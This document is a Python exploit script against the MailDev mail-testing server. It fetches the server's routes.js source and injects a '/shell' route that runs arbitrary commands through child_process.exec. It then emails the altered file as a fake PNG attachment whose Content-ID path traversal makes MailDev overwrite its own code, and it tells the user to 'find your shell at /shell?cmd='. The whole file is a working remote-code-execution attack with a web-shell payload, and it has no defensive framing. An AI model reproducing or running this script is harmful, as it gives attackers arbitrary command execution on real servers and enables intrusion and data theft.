import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import re
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import io
import tarfile
import requests

class MailDevExploit:
    def __init__(self):
        self.smtp_server = input("Please enter the SMTP server: ")
        self.smtp_port = input("Please enter the SMTP port: ")
        self.maildev_web_ui_port = input("Please enter the MailDev web UI port (or just hit enter if you don't know it): ") or ""
        self.sender_email = input("Please enter the sender email address or hit enter for default (your_email@example.com): ") or "your_email@example.com"
        self.recipient_email = input("Please enter the recipient email address or hit enter for default (recipient@example.com): ") or "recipient@example.com"
        self.version = ""

    def get_version(self):
        if self.maildev_web_ui_port:
            auto_version = input("Would you like to automatically try to get version from MailDev web UI? (Y/n/yes/no): ").lower() or 'y'
            if auto_version in ['y', 'yes']:
                print("Getting version number from maildev web UI...")
                options = Options()
                options.add_argument("--headless")
                driver = webdriver.Chrome(options=options)
                driver.get(f'http://{self.smtp_server}:{self.maildev_web_ui_port}/')

                html = driver.page_source
                soup = BeautifulSoup(html, 'html.parser')
                version_tag = soup.find('small', {'class': 'ng-binding'})
                if version_tag:
                    version_text = version_tag.text
                    self.version = version_text.split()[-1]
                    print(f'You are running MailDev {self.version}')
                else:
                    print('Failed to auto detect version')
                    self.version = input("Please enter the MailDev version number or hit enter for default (latest version): ") or 'latest'
                driver.quit()
            else:
                self.version = input("Please enter the MailDev version number or hit enter for default (latest version): ") or 'latest'
        else:
            self.version = input("Please enter the MailDev version number or hit enter for default (latest version): ") or 'latest'

    def download_routes_js(self):
        url = f'https://github.com/maildev/maildev/archive/refs/tags/v{self.version}.tar.gz' if self.version != 'latest' else f'https://raw.githubusercontent.com/maildev/maildev/master/lib/routes.js'
        response = requests.get(url)

        tar_gz_file = io.BytesIO(response.content)

        with tarfile.open(fileobj=tar_gz_file, mode="r:gz") as tar:
            for member in tar.getmembers():
                if member.name.endswith('lib/routes.js'):
                    routes_js_file = tar.extractfile(member)
                    return routes_js_file.read().decode('utf-8')
        return None

    def generate_payload(self, routes_js_content):
        payload = """
            router.get('/shell', function (req, res) {
                const { exec } = require('child_process');
                const command = req.query.cmd;

                if (!command) {
                    return res.status(400).json({ error: 'Command parameter (cmd) is required' });
                }

                exec(command, (error, stdout, stderr) => {
                  if (error) {
                      console.error(`Error: ${error.message}`);
                      res.status(500).json({ error: error.message, stderr, stdout });
                      return;
                  }

                  if (stderr) {
                      console.error(`stderr: ${stderr}`);
                      res.status(500).json({ stderr, stdout });
                      return;
                  }

                  console.log(`stdout: ${stdout}`);
                  res.json({ result: stdout.trim() });
                });
            });
        """
        insert_index = routes_js_content.find('const router = express.Router()')
        if insert_index != -1:
            end_index = insert_index + len('const router = express.Router()')
            routes_js_content = routes_js_content[:end_index] + payload + routes_js_content[end_index:]
        else:
            print("Exploit failed to find offset")
            exit(1)

        return routes_js_content

    def send_malicious_email(self, routes_js_content):
        msg = MIMEMultipart()
        msg["From"] = self.sender_email
        msg["To"] = self.recipient_email
        msg["Subject"] = "Malicious Email Exploit"

        text = MIMEText("Please see the attached image.")
        msg.attach(text)

        malicious_image = MIMEImage(routes_js_content.encode('utf-8'), _subtype="png", name="a.png")
        malicious_image.add_header("Content-ID", "<../../../home/node/lib/routes.js>")
        msg.attach(malicious_image)

        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.sendmail(self.sender_email, self.recipient_email, msg.as_string())
            print("Email sent successfully.")
            print("Find your shell at /shell?cmd=")
        except Exception as e:
            print(f"Error: {e}")

    def run_exploit(self):
        self.get_version()
        routes_js_content = self.download_routes_js()
        if routes_js_content:
            routes_js_content = self.generate_payload(routes_js_content)
            self.send_malicious_email(routes_js_content)
        else:
            print("Failed to retrieve routes.js")

if __name__ == "__main__":
    exploit = MailDevExploit()
    exploit.run_exploit()
